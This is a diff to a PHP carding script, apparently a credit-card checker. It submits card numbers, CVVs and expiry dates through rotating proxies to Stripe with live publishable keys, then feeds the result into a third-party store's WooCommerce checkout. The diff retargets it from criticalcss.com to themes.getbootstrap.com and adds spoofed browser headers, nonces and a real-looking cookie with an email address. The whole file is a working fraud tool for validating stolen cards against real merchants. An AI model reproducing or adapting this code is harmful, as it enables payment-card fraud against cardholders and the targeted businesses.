@@ -112,13 +112,13 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/sources');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'authority: api.stripe.com',
 'method: POST',
-'path: /v1/payment_methods',
+'path: /v1/sources',
 'scheme: https',
 'accept: application/json',
 'accept-language: en-US,en;q=0.9',
@@ -139,7 +139,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=33968&key=pk_live_NGJsMv0MLmtsBQknbpBwDYcE');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&owner[name]='.$name.'+'.$last.'&owner[address][country]=US&owner[email]='.$email.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=d5d641d1-8763-493b-b1a9-f4e909c63e0bcc0c50&muid=0ff126ff-f5d1-4919-b2c0-e4e3f54d3a73ffc77e&sid=066bbf43-c2b8-44d6-9b33-460441287327c5697f&pasted_fields=number&payment_user_agent=stripe.js%2Ff5c0110cf%3B+stripe-js-v3%2Ff5c0110cf&time_on_page=37299&key=pk_live_MDKbnWw3SeuL7D2ajui5ONao');
 
 
 
@@ -151,7 +151,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://criticalcss.com/api/premium/signup-payment');
+curl_setopt($ch, CURLOPT_URL, 'https://themes.getbootstrap.com/?wc-ajax=checkout');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -162,15 +162,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: criticalcss.com',
+'authority: themes.getbootstrap.com',
 'method: POST',
-'path: /api/premium/signup-payment',
+'path: /?wc-ajax=checkout',
 'scheme: https',
-'accept: application/json',
+'accept: application/json, text/javascript, */*; q=0.01',
 'accept-language: en-US,en;q=0.9',
-'content-type: application/json',
-//'cookie: ',
-'origin: https://criticalcss.com',
+'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+//'cookie: mailchimp_landing_site=https://themes.getbootstrap.com/?wc-ajax=get_refreshed_fragments; woocommerce_items_in_cart=1; woocommerce_cart_hash=421b08f597948d2576ed3bc4ad8e7d99; wp_woocommerce_session_f4de320e4a50802cee59045ae887e021=90ab81a7aeb54df624ae91c6229d1b41||1649270084||1649266484||b123767c253ca1d01e3a182ea65fce20; __stripe_mid=0ff126ff-f5d1-4919-b2c0-e4e3f54d3a73ffc77e; __stripe_sid=066bbf43-c2b8-44d6-9b33-460441287327c5697f; mailchimp.cart.current_email=Info@tablig.net; tk_ai=woo:uOP1AEhnas0oJhZ9x9G+x/UG; mailchimp_user_email=Info@tablig.net',
+'origin: https://themes.getbootstrap.com',
+'referer: https://themes.getbootstrap.com/checkout/',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -179,7 +180,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'{"email":"'.$email.'","plan":"price_1HwBoaLYNoSq08J0Q92yIKGh","quantity":1,"customerId":null,"protect":"null","paymentMethodId":"'.$id.'","sp":"null"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'payment_method=stripe&_wpnonce=a72428fc3b&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&billing_first_name='.$name.'&billing_last_name='.$last.'&billing_company=&billing_country=US&billing_email='.$email.'&account_password=&stripe_source='.$id.'');
 
 
 $result2 = curl_exec($ch);
@@ -443,7 +444,7 @@ else {
 curl_close($ch);
 ob_flush();
 
-//echo "<b>Result:</b> $result1<br><br>";
+echo "<b>Result:</b> $result1<br><br>";
 echo "<b>Result:</b> $result2<br><br>";
 
 #---------------------------------------------------------------------------------------------------------------------------------#
